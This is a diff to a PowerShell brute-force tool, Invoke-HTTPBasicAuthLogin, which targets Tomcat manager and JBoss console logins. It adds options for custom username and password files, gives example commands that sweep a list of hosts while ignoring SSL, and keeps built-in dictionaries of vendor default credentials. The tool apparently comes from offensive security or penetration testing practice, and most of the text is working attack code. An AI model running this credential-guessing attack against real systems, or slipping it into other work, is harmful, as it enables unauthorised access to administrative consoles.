@@ -26,9 +26,17 @@
 
 	Supply the username if testing custom, otherwise defaults to custom list.
 
+	.PARAMETER UserNameFile
+
+	Optionally supply a list of users, otherwise defaults to custom list.
+
+	.PARAMETER PasswordFile
+
+	Optionally supply a list of passwords, otherwise defaults to custom list.
+
 	.PARAMETER URIPath
 
-	Supply the URI to test, defaults to /manager/html/.
+	Supply the URI to test, defaults to /manager/html/, example: -URIPath /jmx-console/.
 
 	.PARAMETER IgnoreSSL
 
@@ -56,9 +64,15 @@
 	  
 	.EXAMPLE
 
-	Brute force Tomcat manager login on a list of hosts ignoring SSLL:
+	Brute force Tomcat manager login on a list of hosts ignoring SSL:
 	Invoke-HTTPBasicAuthLogin -File C:\Temp\Hosts.txt -IgnoreSSL
 	
+	  
+	.EXAMPLE
+
+	Brute force Tomcat manager login on a list of hosts ignoring SSL with a custom user and password dictionary:
+	Invoke-HTTPBasicAuthLogin -File C:\Temp\Hosts.txt -IgnoreSSL -UserNameFile users.txt -PasswordFile passwords.txt
+
 	.EXAMPLE
 
 	Brute force a JBOSS web server login on a computer:
@@ -87,16 +101,26 @@ Param(
 
 		[Parameter(Mandatory=$false,
 		HelpMessage='Provide a Computer to test for, attempts to ping to validate connection')]
-        #[ValidateScript({Test-Connection -quiet -count 1 -ComputerName $_})]
+        [ValidateScript({Test-Connection -quiet -count 1 -ComputerName $_.Split(":")[0]})]
 		[string]$Computer = $null,
 
 		[Parameter(Mandatory=$false,
-		HelpMessage='Optionally provide the domain and username if performing authenticated enumeration, example: domain\user1')]
+		HelpMessage='Optionally provide a single custom user')]
 		[string]$UserName,
 
 		[Parameter(Mandatory=$false,
-		HelpMessage='Optionally provide the user password if performing authenticated enumeration')]
+		HelpMessage='Optionally provide a single custom password')]
 		[string]$Password,
+
+		[Parameter(Mandatory=$false,
+		HelpMessage='Optionally provide a custom user list, otherwise defaults to a builtin dictionary')]
+		[ValidateScript({Test-Path $_})]
+        [string]$UserNameFile,
+
+		[Parameter(Mandatory=$false,
+		HelpMessage='Optionally provide a custom password list, otherwise defaults to a builtin dictionary')]
+        [ValidateScript({Test-Path $_})]		
+        [string]$PasswordFile,
 
 	    [Parameter(ParameterSetName = "IgnoreSSL")]
 		[switch]$IgnoreSSL,
@@ -105,18 +129,20 @@ Param(
 		[switch]$BigDictionary,
 
         [Parameter(Mandatory=$false,
-		HelpMessage='Optionally provide the user password if performing authenticated enumeration')]
+		HelpMessage='Optionally provide the user URI string, otherwise defaults to tomcat: /manager/html')]
 		[string]$URIPath = "/manager/html"
 	)
 #Build arrays of default usernames and passwords, passwords based of many lists including Metasploit and custom
 if(!$UserName)
 {
-    if ($BigDictionary) { [array]$UserName = "admin","tomcat","administrator","manager","j2deployer","ovwebusr","cxsdk","root","xampp","ADMIN","testuser" }
+    if ($UserNameFile) { [array]$UserName = Get-Content $UserNameFile }
+    elseif ($BigDictionary) { [array]$UserName = "admin","tomcat","administrator","manager","j2deployer","ovwebusr","cxsdk","root","xampp","ADMIN","testuser" }
     else { [array]$UserName = "admin","tomcat","administrator","manager","j2deployer" }
 }
 if (!$Password)
 {
-    if ($BigDictionary) { [array]$Password = "","admin","password","tomcat","manager","j2deployer","OvW*busr1","kdsxc","owaspbwa","ADMIN","xampp","s3cret","Password1","testuser","redi_123" }
+    if ($PasswordFile) { [array]$Password = Get-Content $PasswordFile }
+    elseif ($BigDictionary) { [array]$Password = "","admin","password","tomcat","manager","j2deployer","OvW*busr1","kdsxc","owaspbwa","ADMIN","xampp","s3cret","Password1","testuser","redi_123" }
     else { [array]$Password = "","admin","password","tomcat","manager","j2deployer" }
 }
 #Ignore SSL From http://connect.microsoft.com/PowerShell/feedback/details/419466/new-webserviceproxy-needs-force-parameter-to-ignore-ssl-errors thanks @Mattifestation and HaIR
